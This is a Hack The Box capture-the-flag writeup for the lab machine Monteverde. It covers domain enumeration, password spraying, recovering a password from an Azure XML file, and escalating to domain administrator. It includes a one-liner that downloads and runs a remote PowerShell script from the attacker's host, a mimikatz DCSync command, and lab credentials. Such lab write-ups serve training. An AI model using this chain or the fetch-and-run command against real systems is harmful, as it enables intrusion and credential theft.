## Hack The Box -- Monteverde writeup


### Enumeration

- First I'll start off with an nmap scan on the target. With the ports that are open on the target host it is definitely a Windows machine and it appears to be a Domain Controller.


	Nmap scan report for 10.129.228.111
	Host is up, received echo-reply ttl 127 (0.063s latency).
	Scanned at 2024-10-09 14:33:36 CDT for 101s

	PORT      STATE SERVICE       REASON          VERSION
	53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
	88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-09 19:33:46Z)
	135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
	389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds? syn-ack ttl 127
	464/tcp   open  kpasswd5?     syn-ack ttl 127
	593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped    syn-ack ttl 127
	3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped    syn-ack ttl 127
	5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
	49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
	49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	49922/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running (JUST GUESSING): Microsoft Windows 2019 (86%)
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Microsoft Windows Server 2019 (86%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/9%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6706DAF5%P=aarch64-unknown-linux-gnu)
	SEQ(SP=F9%GCD=1%ISR=FC%TI=I%II=I%SS=S%TS=U)
	OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
	WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
	ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
	T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=N)
	U1(R=N)
	IE(R=Y%DFI=N%TG=80%CD=Z)

	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=249 (Good luck!)
	IP ID Sequence Generation: Incremental
	Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

	Host script results:
	| p2p-conficker: 
	|   Checking for Conficker.C or higher...
	|   Check 1 (port 59714/tcp): CLEAN (Timeout)
	|   Check 2 (port 53139/tcp): CLEAN (Timeout)
	|   Check 3 (port 29693/udp): CLEAN (Timeout)
	|   Check 4 (port 64775/udp): CLEAN (Timeout)
	|_  0/4 checks are positive: Host is CLEAN or ports are blocked
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required
	|_clock-skew: 3s
	| smb2-time: 
	|   date: 2024-10-09T19:34:41
	|_  start_date: N/A

	TRACEROUTE (using port 135/tcp)
	HOP RTT      ADDRESS
	1   64.15 ms 10.10.14.1
	2   64.21 ms 10.129.228.111


### Enumerating RPC

	user:[Guest] rid:[0x1f5]
	user:[AAD_987d7f2f57d2] rid:[0x450]
	user:[mhope] rid:[0x641]
	user:[SABatchJobs] rid:[0xa2a]
	user:[svc-ata] rid:[0xa2b]
	user:[svc-bexec] rid:[0xa2c]
	user:[svc-netapp] rid:[0xa2d]
	user:[dgalanos] rid:[0xa35]
	user:[roleary] rid:[0xa36]
	user:[smorgan] rid:[0xa37]

- Users:

- Guest
- AAD_987d7f2f57d2
- mhope
- SABatchJobs
- svc-ata
- svc-bexec
- svc-netapp
- dgalanos
- roleary 0x201
- smorgan


#### RPC User Info

	rpcclient $> queryuser smorgan
		   User Name   :   smorgan
		   Full Name   :   Sally Morgan
		   Home Drive  :   \\monteverde\users$\smorgan
		   Dir Drive   :   H:
		   Profile Path:
		   Logon Script:
		   Description :
		   Workstations:
		   Comment     :
		   Remote Dial :
		   Logon Time               :      Wed, 31 Dec 1969 17:00:00 MST
		   Logoff Time              :      Wed, 31 Dec 1969 17:00:00 MST
		   Kickoff Time             :      Wed, 13 Sep 30828 21:48:05 CDT
		   Password last set Time   :      Fri, 03 Jan 2020 07:09:22 CST
		   Password can change Time :      Sat, 04 Jan 2020 07:09:22 CST
		   Password must change Time:      Wed, 13 Sep 30828 21:48:05 CDT
		   unknown_2[0..31]...
		   user_rid :      0xa37
		   group_rid:      0x201
		   acb_info :      0x00000210
		   fields_present: 0x00ffffff
		   logon_divs:     168
		   bad_password_count:     0x00000000
		   logon_count:    0x00000000
		   padding1[0..7]...
		   logon_hrs[0..21]...

- We get a Description for the AAD_ user

Description :   Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. 


- We also get the domain megabank SID.

Description :   Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.


#### SMB enumeration

Running crackmap exec we can see that the user SABatchJobs has the same username and password and we are able to list the available shares. From the output it looks like we have read access to the following shares:

1. azure_uploads
2. IPC$
3. NETLOGON$
4. SYSVOL
5. users$

	$ crackmapexec smb -u users.txt -p users.txt --shares

![SMB](/Monteverde/images/smb-cme.png) 


We can try connecting to smb and see if there's anything interesting in the shares we have access to or now since we have valid credentials we could try running lpaddomaindump to get some info from ldap. Let's run try ldapdomaindump and if it doesn't return anything we'll check out smb. 


#### ldap enumeration

ldapdomaindump works and we get a list of:

1. domain-computers
2. domain-groups
3. domain-policy
4. domain-trusts
5. domain-users

![ldap](/Monteverde/images/domain-dump.png) 

If we open the domain-users html file we can see that the user SABatchJobs isn't a member of any other groups. But Mike Hope(mhope) is a member of the Azure Admins, and Remote Management groups. Dimitris Galanos(dgalanos) is a member of the Trading group. Ray O'Leary (roleary) is a member of the HelpDesk group, Sally Morgan (smorgan) is a member of the Operations group, and AAD_987d7f2f57d2 is a member of the Azure Admins, and Users groups. 


![ldap](/Monteverde/images/domain-users.png) 

From the 'domain-computers-by-os' html file we can determine the following:

1. CN=MONTEVERDE
2. SAM Name=MONTEVERDE$
3. DNS Hostname= MONTEVERDE.MEGABANK.LOCAL
4. OS = Windows Sever 2019 Standard
5. OS Version = 10.0 (17763)
6. Last Logon = 10/11/24 16:30:38
7. Flags = SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
8. SID = 1000


![ldap](/Monteverde/images/domain-os.png) 


#### Back to SMB enum.

Let's go back to SMB and see if we can get any information from the shares that we have access to. So we know that our user SABatchJobs with the same password has read access to the following shares:

1. azure_uploads
2. IPC$
3. NETLOGON$
4. SYSVOL
5. users$ 

I'm going to use smbclient and try to access those shares, I'll start off with azure_uploads. azure_uploads is empty and I can't put files or create directories, on to IPC$, users$ mhope has an azure.xml file that I get. However, when I try to open the xml file to read it it's definitely not xml and is something else entirely. 


![smb](/Monteverde/images/smb-users.png) 

The SYSVOL Share has lots of files and directies so I just grab everything out of smb so I can parse through it on my attack machine. There is not much interesting yet in the SYSVOL Share it gives use all the 'Privilege Rights' on the host and their corresponding SID's. This will most likely be useful later on though so I will make note of it now.

- Privilege Rights

	SeAssignPrimaryTokenPrivilege = *S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-20,*S-1-5-19,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
	SeAuditPrivilege = *S-1-5-20,*S-1-5-19
	SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
	SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
	SeChangeNotifyPrivilege = *S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
	SeCreatePagefilePrivilege = *S-1-5-32-544
	SeDebugPrivilege = *S-1-5-32-544
	SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
	SeIncreaseQuotaPrivilege = *S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
	SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
	SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
	SeMachineAccountPrivilege = *S-1-5-11
	SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
	SeProfileSingleProcessPrivilege = *S-1-5-32-544
	SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
	SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
	SeSecurityPrivilege = *S-1-5-32-544
	SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
	SeSystemEnvironmentPrivilege = *S-1-5-32-544
	SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
	SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
	SeTakeOwnershipPrivilege = *S-1-5-32-544
	SeUndockPrivilege = *S-1-5-32-544
	SeEnableDelegationPrivilege = *S-1-5-32-544

![smb](/Monteverde/images/smb-sysvol.png) 


There is nothing in the NETLOGON share so now back to the xml file. If try to cat it out it just returns some smybols. Running the file command against it though returns the following, this little endian text is not going to be human readable. After a little Google-fu I find an iconv command that turns the file into ASCII text so we can read it. Now when I try and cat it out I can find another password.

- Azure file before conversion

	file azure.xml 
	azure.xml: Unicode text, UTF-16, little-endian text, with CRLF line terminators 
	
- converting the azure file 

	iconv -f UTF-16 -t US-ASCII azure.xml -o azure.xml_test

- Azure file after conversion

	file azure.xml_test 
	azure.xml_test: ASCII text, with CRLF line terminators

- Now if we cat out the azure.xml_test file we get the following.

	cat azure.xml_test      
	<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
	  <Obj RefId="0">
	    <TN RefId="0">
		 <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
		 <T>System.Object</T>
	    </TN>
	    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
	    <Props>
		 <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
		 <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
		 <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
		 <S N="Password">4n0therD4y@n0th3r$</S>
	    </Props>
	  </Obj>
	</Objs>


- We can now see the file contains the following password that looks like it for an AD account. We can use crackmapexec again with our list of users to see if it works for any of them.

- Password
- 4n0therD4y@n0th3r$

Using crackmapexec we find that the password works for the user mhope, any if you remember from our earlier enumeration mhope is also a member of the Remote Management, and Azure Admins group. Checking with crackmapexec and sure enough the creds we have will work with winrm. We can now use evil-winrm to get a shell on the target host! I did also check rdp with our creds but I then remembered rdp port 3389 is not open on this box.


![smb](/Monteverde/images/winrm.png) 

- evil-winrm
- username: mhope
- password: 4n0therD4y@n0th3r$


### Foothold


We now have a working shell as mhope and can grab the users.txt flag from his \Desktop folder. I'm interested in the fact that our user is also a member of the Azure Admin's group. I think it's time to see if we can enumerate Active Directory or more precisely some misconfigurations in AD. We can either do this manually, with PowerView, or with BloodHound. I think I'm going to go the BloodHound route. I'm going to upload a SharpHound executeable to our target and collect the information we will need to be able to run in BloodHound.


![foothold](/Monteverde/images/foothold.png) 


First I'll see what the current execution policy is set to on our current user, and it is RemoteSigned, so I'll change the execution policy to unrestricted so we don't get flagged when trying to run scripts on the target host.

	$ Get-ExecutionPolicy -Scope CurrentUser
	$ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


![Foothold](/Monteverde/images/execution.png) 

- evil-winrm has a nice upload / download feature so all I have to do is have SharpHound in my working directory in which I got the evil-winrm shell I can simply execute 'upload SharpHound.ps1' to move it from my attack box to the target. With it on the target. I load the PowerShell file then use the Invoke-Bloodhound with the flags I want set. This [website](https://harshdushyants.medium.com/bloodhound-and-sharphound-9919c1bf44a6) has a great explaination of using ShareHound. 


![AD Enumeration](/Monteverde/images/execution-2.png) 

I uploaded and installed PowerView to the target just to make sure the domain was correct now I will run SharpHound.ps1 to collect the information we will need for BloodHound enumeration. For whatever reason the PowerShell file would never run for me on the Host so I had to upload the exe version of SharpHound to the target and it ran just fine. It created a zip file for us and now we can just download it to our attack machine and start emerating with BloodHound.


![AD Enumeration](/Monteverde/images/exe.png) 


#### BloodHound enumeration

- To get BloodHound running first we'll have to start the neo4j console. The default login is neo4j:neo4j.
- After neo4j is running we should be able to confirm this by going to localhost:7474 in the web browser. 
- Now with neo4j and BloodHound both running we can simply drag and drop the zip file onto the bloodhound screen or upload them with the 'import data' button on the right hand side console in bloodhound.

- Bloodhound should have a progress screen pop up that will show you when all of the json files have been loaded. After that we are ready to enumerate.

![AD Enumeration](/Monteverde/images/neo4j.png) 


![AD Enumeration](/Monteverde/images/bloodhound.png) 


![AD Enumeration](/Monteverde/images/files.png) 


- Looking at the graph in bloodhound we can see that our current user can PSRemote to MONTEVERDE.MEGABANK.LOCAL which we already knew.
- But then looking further it shows that members of the monterverde.megabank.local have DCSnyc writes. This could be an easy win either through linux with secrets dump or with mimikatz on the Windows host. If we right-click on any of the edges in bloodhound it will give us and example of what the privilege or misconfiguration is and how to take advantage of it. Let's take a look at the DCSync edge.


![AD Enumeration](/Monteverde/images/dcsync.png) 


![AD Enumeration](/Monteverde/images/dc-windows.png) 


- Since we know we can get a working shell through evil-winrm. Let's try to upload mimikatz to the target and run the commands that it shows in the example.

	lsadump::dcsync /domain:megabank.local /user:Administrator

- I could never get mimikatz to stay on the target machine anti-virus kept removing it before I could execute it. Enumerating the domain and users some more I find the following information with PowerView 1st filtering on samaccountname, and useraccountcontrol. 


- Domain User Enum


	*Evil-WinRM* PS C:\Users\mhope\Documents> Get-DomainUser -Identity * -Domain megabank.local | select samaccountname, useraccountcontrol

	samaccountname                                                     useraccountcontrol
	--------------                                                     ------------------
	Administrator                                    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	Guest            ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	krbtgt                                                 ACCOUNTDISABLE, NORMAL_ACCOUNT
	AAD_987d7f2f57d2                                 NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	mhope                                            NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	SABatchJobs                                      NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	svc-ata                                          NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	svc-bexec                                        NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	svc-netapp                                       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	dgalanos                                         NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	roleary                                          NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
	smorgan                                          NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

	*Evil-WinRM* PS C:\Users\mhope\Documents> Get-DomainUser -Identity * -Domain megabank.local | select samaccountname, memberof

	samaccountname   memberof
	--------------   --------
	Administrator    {CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL, CN=ADSyncAdmins,CN=Users,DC=MEGABANK,DC=LOCAL, CN=Group Policy Creator Owners,CN=Users,DC=MEGABANK,DC=LOCAL, CN=Domain Admins,CN=Users,DC=MEGABANK,DC=LOCAL...}
	Guest            CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCAL
	krbtgt           CN=Denied RODC Password Replication Group,CN=Users,DC=MEGABANK,DC=LOCAL
	AAD_987d7f2f57d2 {CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL, CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL}
	mhope            {CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL, CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL}
	SABatchJobs
	svc-ata
	svc-bexec
	svc-netapp
	dgalanos         CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
	roleary          CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
	smorgan          CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL


- Domain Groups Enum


	*Evil-WinRM* PS C:\Users\mhope\Documents> Get-domaingroup -properties name                                                                            
		                                                                                                                                                 
	name             
	----           
	Administrators    
	Users                
	Guests       
	Print Operators            
	Backup Operators   
	Replicator      
	Remote Desktop Users
	Network Configuration Operators   
	Performance Monitor Users     
	Performance Log Users                                                      
	Distributed COM Users
	IIS_IUSRS
	Cryptographic Operators
	Event Log Readers
	Certificate Service DCOM Access
	RDS Remote Access Servers
	RDS Endpoint Servers
	RDS Management Servers
	Hyper-V Administrators
	Access Control Assistance Operators
	Remote Management Users
	Storage Replica Administrators
	Domain Computers
	Domain Controllers
	Schema Admins
	Enterprise Admins
	Cert Publishers
	Domain Admins
	Domain Users
	Domain Guests
	Group Policy Creator Owners
	RAS and IAS Servers
	Server Operators
	Account Operators
	Pre-Windows 2000 Compatible Access
	Incoming Forest Trust Builders
	Windows Authorization Access Group
	Terminal Server License Servers
	Allowed RODC Password Replication Group
	Denied RODC Password Replication Group
	Read-only Domain Controllers
	Enterprise Read-only Domain Controllers
	Cloneable Domain Controllers
	Protected Users
	Key Admins
	Enterprise Key Admins
	DnsAdmins
	DnsUpdateProxy
	SQLServer2005SQLBrowserUser$MONTEVERDE
	ADSyncAdmins
	ADSyncOperators
	ADSyncBrowse
	ADSyncPasswordSet
	Azure Admins
	File Server Admins
	Call Recording Admins
	Reception
	Operations
	Trading
	HelpDesk
	Developers

	Domain Computers
	Domain Controllers                             
	Schema Admins                           CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL                                                                                                         
	Enterprise Admins                       CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL                                                                                                         
	Cert Publishers                                                                                                                                                                                
	Domain Admins                           CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL                                                                                                         
	Domain Users                                   
	Domain Guests                                  
	Group Policy Creator Owners             CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL                                                                                                         
	RAS and IAS Servers                                                                            
	Server Operators                               
	Account Operators                              
	Pre-Windows 2000 Compatible Access      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=MEGABANK,DC=LOCAL                                                                                          
	Incoming Forest Trust Builders                 
	Windows Authorization Access Group      CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=MEGABANK,DC=LOCAL                                                                                           
	Terminal Server License Servers                
	Allowed RODC Password Replication Group                                                        
	Denied RODC Password Replication Group  {CN=Read-only Domain Controllers,CN=Users,DC=MEGABANK,DC=LOCAL, CN=Group Policy Creator Owners,CN=Users,DC=MEGABANK,DC=LOCAL, CN=Domain Admins,CN=Users
	,DC=MEGABANK,DC=LOCAL, CN=Cert Publishers,CN=Users,DC=M...                                     
	Read-only Domain Controllers                   
	Enterprise Read-only Domain Controllers                                                        
	Cloneable Domain Controllers                   
	Protected Users                                
	Key Admins                                     
	Enterprise Key Admins                          
	DnsAdmins                                      
	DnsUpdateProxy                                 
	SQLServer2005SQLBrowserUser$MONTEVERDE                                                         
	ADSyncAdmins                            CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL                                                                                                         
	ADSyncOperators                                
	ADSyncBrowse                                   
	ADSyncPasswordSet                              
	Azure Admins                            {CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL, CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL, CN=Administrator,CN=Users,DC=MEGABAN
	K,DC=LOCAL}


### Privilege Escalation 

- From enumeration we notice that the user mhope is a member of the Remote Management Group, and Azure Admins group. Since he is a member of the member of the Azure Admins group. [There is an amazing privilege escalation technique explained in this github repo that will allow him to run a powershell script and dump the credentials of the administrator account](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1). 

- I created the script and ran the following command to retrieve it from my attack box and run it on the target and got the admin credentials.


iex(new-object net.webclient).downloadstring('http://10.10.14.240/azuread_decrypt_msol.ps1')

- Running the script gives me Administrator password

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!


![AD Enumeration](/Monteverde/images/admin.png) 


- Admin Creds

- Username: administrator
- Password: d0m@in4dminyeah!


![Priv Esc](/Monteverde/images/root.png) 

- Confirming through crackmapexec we can root the box with either psexec or evil-winrm. I'm going to try and just do it through psexec since I haven't used it yet.


![Priv Esc](/Monteverde/images/privesc.png) 

- running psexec with administrator and the credentials that we found gives us a user running as NT Authority / SYSTEM. And we can grab the root flag. 
